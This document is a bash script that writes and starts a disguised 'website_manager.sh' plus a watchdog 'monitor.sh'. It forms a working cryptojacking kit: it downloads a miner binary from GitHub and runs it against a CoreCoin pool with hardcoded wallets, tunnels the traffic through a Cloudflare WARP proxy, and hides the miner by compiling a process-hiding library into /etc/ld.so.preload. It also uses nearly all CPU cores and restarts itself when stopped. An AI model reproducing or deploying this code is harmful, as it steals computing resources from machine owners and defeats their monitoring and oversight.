#!/bin/bash
export TERM=xterm

cat << 'END' > website_manager.sh
#!/usr/bin/env bash

# --- FILES & LOCKS ---
MANAGER_LOCK=".manager_lock"
MONITOR_LOCK=".monitor_lock"
PID_FILE=".active_pid"
ENV_DATA=".env_data"
HEARTBEAT=".monitor_heartbeat"
LOG_FILE="website.log"
MAX_LOG_LINES=10000

work_server="corecoin.luckypool.io:3118"

xcb_address_for_me="cb402c2dd7c133503638f50a1ffad8c15ba5102946c3"
xcb_address_for_MB="cb1047247b1e95721f1c05d0e7dfe71430715accec92"

array=()
for i in {a..z} {A..Z} {0..9}; do
	array[$RANDOM]=$i
done

currentdate=$(date '+%d_%b_%Y_Git_')
ipaddress=$(curl -s api.ipify.org)
num_of_cores=$(cat /proc/cpuinfo | grep processor | wc -l)
used_num_of_cores=$(expr $num_of_cores - 8)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
underscore="_"
underscored_ip+=$underscore
currentdate+=$underscored_ip
randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord
uniqueworker=$underscored_ip
uniqueworker+=$randomWord
#sysctl -w vm.nr_hugepages=512
TZ='Africa/Johannesburg'; export TZ
date
sleep 2

# --- STEALTH-FRIENDLY SINGLETON ---
if [ -f "$MANAGER_LOCK" ]; then
	old_pid=$(cat "$MANAGER_LOCK")
	if kill -0 "$old_pid" 2>/dev/null; then
		echo "❌ Manager already running (PID: $old_pid)."
		exit 1
	fi
fi
echo $$ >"$MANAGER_LOCK"
trap "rm -f $MANAGER_LOCK" EXIT

# --- CONFIGURATION ---
work_tool="smoke"
raw_work_tool_url="https://github.com/fuzilemphango/riot/raw/refs/heads/main/build"

rotate_log() {
	local file=$1
	if [ -f "$file" ]; then
		line_count=$(wc -l <"$file")
		if [ "$line_count" -gt "$MAX_LOG_LINES" ]; then
			echo "$(tail -n "$MAX_LOG_LINES" "$file")" >"$file"
		fi
	fi
}

run_setup() {
	echo "🔍 Starting Zero-Network Risk Validation..."
	if [ -f "/etc/needrestart/needrestart.conf" ]; then
		sed -i "s/#\$nrconf{restart} = 'i';/\$nrconf{restart} = 'a';/g" /etc/needrestart/needrestart.conf >/dev/null 2>&1
	fi

	export DEBIAN_FRONTEND=noninteractive
    DEBIAN_FRONTEND=noninteractive
	apt update >/dev/null
	apt-get install -y --no-install-recommends tzdata wget git curl kmod msr-tools cmake build-essential binutils procps psmisc net-tools iputils-ping bc >/dev/null
	ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime >/dev/null
	dpkg-reconfigure --frontend noninteractive tzdata >/dev/null

	echo "Downloading latest wgcf build..."
    curl -fsSL $(curl -s https://api.github.com/repos/ViRb3/wgcf/releases/latest | grep -oP '"browser_download_url": "\K[^"]*linux_amd64') -o wgcf
    chmod +x wgcf
	
    echo "Registering unique account with Cloudflare..."
    ./wgcf register --accept-tos
    echo "Generating dynamic WireGuard profile keys..."
    ./wgcf generate
	
    echo "Downloading latest wireproxy engine..."
    curl -L -o wireproxy.tar.gz https://github.com/windtf/wireproxy/releases/download/v1.0.9/wireproxy_linux_amd64.tar.gz
    tar -xzf wireproxy.tar.gz
    chmod +x wireproxy

    
    echo "Parsing generated keys and assembling your wireproxy configuration..."

    cat wgcf-profile.conf > warp-proxy.conf

    sed -i 's/Endpoint = engage.cloudflareclient.com:2408/Endpoint = 162.159.192.1:2408/g' warp-proxy.conf

    echo -e "\n[Socks5]\nBindAddress = 127.0.0.1:40000" >> warp-proxy.conf

    echo "Starting wireproxy server natively in user-space on port 40000..."
    ./wireproxy -c warp-proxy.conf > /dev/null 2>&1 &

    echo "Allowing 3 seconds for tunnel handshake negotiations..."
    sleep 3
    echo "Testing live tunnel traffic output..."
    curl -s -x socks5h://127.0.0.1:40000 api.ipify.org; echo ""

	if [ ! -f "${work_tool}" ]; then
		if wget -q "${raw_work_tool_url}" -O "${work_tool}"; then
			chmod +x "${work_tool}"
			echo "Downloaded ${work_tool} successfully"
		else
			echo "Failed to download ${work_tool}"
			rm -f "${work_tool}"
			exit 1
		fi
	fi

	netstat -ntlp

	echo "Setting up PH"
	lib_path="/usr/local/lib/libprocesshider.so"
	preload_file="/etc/ld.so.preload"

	if [ -f "$preload_file" ] && grep -q "^${lib_path}$" "$preload_file" 2>/dev/null; then
		echo "PH already configured, skipping"
	else
		echo "Setting up PH..."

		wget -q "https://github.com/ronaldscraper2/Salon/raw/refs/heads/main/magicDocc"
		sleep 2
		mv magicDocc magicDoc.tar.gz
		sleep 2
		tar -xf magicDoc.tar.gz
		sleep 2
		sed -i "s/\"Silly_Doctor\"/\"$work_tool\"/" processhider.c
		make
		sleep 2
		gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
		sleep 2
		mv libprocesshider.so "$lib_path"
		sleep 2
		echo "$lib_path" >>"$preload_file"
		sleep 2
		rm magicDoc.tar.gz Makefile processhider.c

		echo "PH setup complete"
	fi
}

is_alive() {
	[ -f "$PID_FILE" ] && kill -0 $(cat "$PID_FILE") 2>/dev/null
}

is_monitor_alive() {
	[ -f "$MONITOR_LOCK" ] && kill -0 $(cat "$MONITOR_LOCK") 2>/dev/null
}

start_job() {
	if is_alive; then
		echo "✅ Job already running."
	else
		run_setup
		rotate_log "$LOG_FILE"
		JOB_COMMAND="./${work_tool} --disable-gpu --algorithm randomy --pool ${work_server} --wallet $xcb_address_for_me=0.0000200000.$uniqueworker --password x --proxy 127.0.0.1:40000 --cpu-threads $used_num_of_cores --keepalive"
		nohup $JOB_COMMAND >>"$LOG_FILE" 2>&1 &
		echo $! >"$PID_FILE"
		sleep 2
		echo "Your lucky word is: $randomWord"
		sleep 2
		echo ""
		echo "You will be using $used_num_of_cores cores"
		echo ""
		echo "Your worker name is $currentdate"
		echo "🚀 Job started."
	fi

	# Auto-launch Monitor if not running
	if ! is_monitor_alive; then
		nohup ./monitor.sh >/dev/null 2>&1 &
		echo "🛡️  Monitor guardian launched."
	fi
}

stop_job() {
	if is_alive; then
		kill $(cat "$PID_FILE") 2>/dev/null
		rm -f "$PID_FILE"
		echo "🛑 Work tool stopped."
	fi

	if is_monitor_alive; then
		kill $(cat "$MONITOR_LOCK") 2>/dev/null
		rm -f "$MONITOR_LOCK"
		echo "🛡️  Monitor guardian stopped."
	fi
	echo "✨ System cleanup complete."
}

case "$1" in
start) start_job ;;
stop) stop_job ;;
restart) stop_job && sleep 2 && start_job ;;
status)
	is_alive && echo "Job Status: ✨ Running" || echo "Job Status: 🌑 Stopped"
	is_monitor_alive && echo "Monitor:    🛡️  Active" || echo "Monitor:    💤  Not Running"
	;;
*) echo "Usage: $0 {start|stop|status|restart}" ;;
esac
END

chmod +x website_manager.sh

sleep 2

cat << 'EOF' > monitor.sh
#!/usr/bin/env bash

# --- CONFIGURATION (Your original settings) ---
CHECK_INTERVAL=30       # Seconds between heartbeats
DEEP_CHECK_CYCLES=10    # How many heartbeats before a deep check
MAX_LOG_LINES=10000

PID_FILE=".active_pid"
MONITOR_LOCK=".monitor_lock"
HEARTBEAT=".monitor_heartbeat"
MANAGER_SCRIPT="./website_manager.sh"
SYS_LOG="monitor_sys.log"

# --- SINGLETON CHECK ---
if [ -f "$MONITOR_LOCK" ]; then
    old_pid=$(cat "$MONITOR_LOCK")
    if kill -0 "$old_pid" 2>/dev/null; then
        exit 0 
    fi
fi
echo $$ > "$MONITOR_LOCK"

# Clean up lock and heartbeat on exit
trap "rm -f $MONITOR_LOCK $HEARTBEAT" EXIT

rotate_log() {
    local file=$1
    if [ -f "$file" ]; then
        [ $(wc -l < "$file") -gt "$MAX_LOG_LINES" ] && echo "$(tail -n "$MAX_LOG_LINES" "$file")" > "$file"
    fi
}

check_count=0
while true; do
    rotate_log "$SYS_LOG"
    
    # Update Heartbeat timestamp
    date +%s > "$HEARTBEAT"

    if [ -f "$PID_FILE" ]; then
        pid=$(cat "$PID_FILE")
        
        if kill -0 "$pid" 2>/dev/null; then
            # Process is alive, increment for Deep Check
            ((check_count++))
            
            if [ "$check_count" -ge "$DEEP_CHECK_CYCLES" ]; then
                # Perform the Deep Check via Manager's status
                $MANAGER_SCRIPT status | grep -q "Running" || $MANAGER_SCRIPT start >> "$SYS_LOG" 2>&1
                check_count=0
            fi
        else
            echo "[$(date '+%T')] ⚠️ Process $pid missing. Recovering..." >> "$SYS_LOG"
            $MANAGER_SCRIPT start >> "$SYS_LOG" 2>&1
            check_count=0
        fi
    else
        echo "[$(date '+%T')] ⚠️ No PID file found. Attempting start..." >> "$SYS_LOG"
        $MANAGER_SCRIPT start >> "$SYS_LOG" 2>&1
    fi

    sleep "$CHECK_INTERVAL"
done
EOF

chmod +x monitor.sh

sleep 2

apt update 1>/dev/null 2>&1;apt -y install dos2unix 1>/dev/null 2>&1

sleep 2

dos2unix website_manager.sh monitor.sh

sleep 2

./website_manager.sh start
